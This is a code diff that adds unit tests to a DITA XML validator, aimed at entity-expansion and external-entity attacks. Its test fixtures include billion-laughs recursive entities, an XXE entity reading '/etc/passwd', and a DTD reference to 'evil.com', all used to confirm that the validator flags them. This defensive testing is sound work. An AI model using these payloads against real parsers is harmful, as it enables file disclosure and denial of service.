@@ -526,4 +526,118 @@ suite('validateDITADocument', () => {
             assert.ok(diags.length <= 2);
         });
     });
+
+    suite('Entity expansion pre-check (CVE-2026-26278 defense)', () => {
+        test('detects recursive entity definition (billion laughs)', () => {
+            const xml = [
+                '<!DOCTYPE topic [',
+                '  <!ENTITY lol "lol">',
+                '  <!ENTITY lol2 "&lol;&lol;&lol;">',
+                ']>',
+                '<topic id="t1"><title>T</title></topic>',
+            ].join('\n');
+            const diags = validate(xml);
+            const secDiags = diags.filter(d => d.code === 'DITA-SEC-001');
+            assert.strictEqual(secDiags.length, 1);
+            assert.ok(secDiags[0].message.includes('lol2'));
+        });
+
+        test('detects external entity (SYSTEM)', () => {
+            const xml = [
+                '<!DOCTYPE topic [',
+                '  <!ENTITY xxe SYSTEM "file:///etc/passwd">',
+                ']>',
+                '<topic id="t1"><title>T</title></topic>',
+            ].join('\n');
+            const diags = validate(xml);
+            const secDiags = diags.filter(d => d.code === 'DITA-SEC-002');
+            assert.strictEqual(secDiags.length, 1);
+            assert.ok(secDiags[0].message.includes('xxe'));
+        });
+
+        test('detects external entity (PUBLIC)', () => {
+            const xml = [
+                '<!DOCTYPE topic [',
+                '  <!ENTITY ext PUBLIC "-//EVIL//DTD" "http://evil.com/payload.dtd">',
+                ']>',
+                '<topic id="t1"><title>T</title></topic>',
+            ].join('\n');
+            const diags = validate(xml);
+            const secDiags = diags.filter(d => d.code === 'DITA-SEC-002');
+            assert.strictEqual(secDiags.length, 1);
+            assert.ok(secDiags[0].message.includes('ext'));
+        });
+
+        test('detects excessive entity count', () => {
+            const entities = Array.from({ length: 51 }, (_, i) =>
+                `  <!ENTITY e${i} "val${i}">`
+            ).join('\n');
+            const xml = [
+                `<!DOCTYPE topic [\n${entities}\n]>`,
+                '<topic id="t1"><title>T</title></topic>',
+            ].join('\n');
+            const diags = validate(xml);
+            const secDiags = diags.filter(d => d.code === 'DITA-SEC-003');
+            assert.strictEqual(secDiags.length, 1);
+            assert.ok(secDiags[0].message.includes('51'));
+            assert.ok(secDiags[0].message.includes('50'));
+        });
+
+        test('allows safe entity definitions (no recursion, no external)', () => {
+            const xml = [
+                '<!DOCTYPE topic [',
+                '  <!ENTITY product "DitaCraft">',
+                '  <!ENTITY version "1.0">',
+                ']>',
+                '<topic id="t1"><title>T</title></topic>',
+            ].join('\n');
+            const diags = validate(xml);
+            const secDiags = diags.filter(d =>
+                d.code === 'DITA-SEC-001' ||
+                d.code === 'DITA-SEC-002' ||
+                d.code === 'DITA-SEC-003'
+            );
+            assert.strictEqual(secDiags.length, 0);
+        });
+
+        test('no false positive on DOCTYPE without internal subset', () => {
+            const xml = '<!DOCTYPE topic PUBLIC "-//OASIS//DTD DITA Topic//EN" "topic.dtd">\n<topic id="t1"><title>T</title></topic>';
+            const diags = validate(xml);
+            const secDiags = diags.filter(d =>
+                d.code === 'DITA-SEC-001' ||
+                d.code === 'DITA-SEC-002' ||
+                d.code === 'DITA-SEC-003'
+            );
+            assert.strictEqual(secDiags.length, 0);
+        });
+
+        test('detects parameter entity reference in value', () => {
+            const xml = [
+                '<!DOCTYPE topic [',
+                '  <!ENTITY % base "content">',
+                '  <!ENTITY derived "%base; extended">',
+                ']>',
+                '<topic id="t1"><title>T</title></topic>',
+            ].join('\n');
+            const diags = validate(xml);
+            const secDiags = diags.filter(d => d.code === 'DITA-SEC-001');
+            assert.strictEqual(secDiags.length, 1);
+            assert.ok(secDiags[0].message.includes('derived'));
+        });
+
+        test('classic billion laughs attack pattern detected', () => {
+            const xml = [
+                '<!DOCTYPE topic [',
+                '  <!ENTITY lol "lol">',
+                '  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">',
+                '  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">',
+                ']>',
+                '<topic id="t1"><title>&lol3;</title></topic>',
+            ].join('\n');
+            const diags = validate(xml);
+            const expansionDiags = diags.filter(d => d.code === 'DITA-SEC-001');
+            // lol2 and lol3 both reference other entities
+            assert.strictEqual(expansionDiags.length, 2);
+        });
+    });
 });
